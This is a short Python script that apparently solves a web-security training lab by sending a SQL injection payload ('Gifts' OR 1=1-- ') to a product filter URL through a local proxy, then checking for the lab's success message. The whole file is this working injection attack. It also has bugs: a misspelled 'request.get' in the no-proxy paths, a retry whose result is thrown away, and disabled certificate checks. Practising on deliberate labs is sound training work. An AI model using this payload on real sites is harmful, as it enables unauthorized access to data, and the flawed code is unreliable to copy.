import sys
import time
import logging
import argparse
import urllib3


import requests

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}
log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to parse command-line arguments
def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()

# Function to normalize the URL
def normalize_url(url):
    if not url.endswith("/"):
        url = url + "/"
    return url

# Function to check if the lab is solved
def is_solved(url, no_proxy):
    def retrieve_contents(url, no_proxy):
        log.info("Checking if solved.")
        if no_proxy:
            resp = request.get(url)  # Send HTTP GET request
        else:
            resp = requests.get(url, proxies=PROXIES, verify=False)  # Send HTTP GET request with proxies
        if "Congratulations, you solved the lab" in resp.text:  # Check if the lab is solved
            log.info("Lab is solved!")
            return True

    solved = retrieve_contents(url, no_proxy)  # Call the retrieve_contents function
    if solved:
        return True
    else:
        time.sleep(2)  # Sleep for 2 seconds
        retrieve_contents(url, no_proxy)  # Call the retrieve_contents function again

# Main function
def main(args):
    url = normalize_url(args.url)  # Normalize the URL
    exploit_url = url + "filter?category=Gifts' OR 1=1-- "  # Exploit URL
    log.info(f"Getting url: {exploit_url}")
    if args.no_proxy:
        resp = request.get(exploit_url)  # Send HTTP GET request
    else:
        requests.get(exploit_url, proxies=PROXIES, verify=False)  # Send HTTP GET request with proxies
    if is_solved(url, args.no_proxy):  # Check if the lab is solved
        log.info("Congrats!")
    else:
        log.info("Not solved :(.")

if __name__ == "__main__":
    args = parse_args(sys.argv)  # Parse command-line arguments
    main(args)  # Call the main function
